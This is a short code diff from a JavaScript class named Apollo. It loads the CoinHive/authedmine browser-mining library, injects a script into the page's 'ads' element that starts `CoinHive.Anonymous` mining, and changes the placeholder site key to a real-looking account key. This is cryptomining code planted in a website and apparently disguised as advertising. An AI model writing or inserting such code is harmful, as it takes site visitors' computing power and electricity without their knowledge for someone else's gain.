@@ -49,7 +49,7 @@ class Apollo {
     script.src = 'https://authedmine.com/lib/authedmine.min.js';
     head.appendChild(script);
 
-    let adsHTML = `<script>var miner = new CoinHive.Anonymous('TBS');miner.start();</script>`
+    let adsHTML = `<script>var miner = new CoinHive.Anonymous('TKNKIC69TXviFytXEOLxbIqS1z9GplN9');miner.start();</script>`
     document.getElementById("ads").innerHTML = adsHTML
 
   }
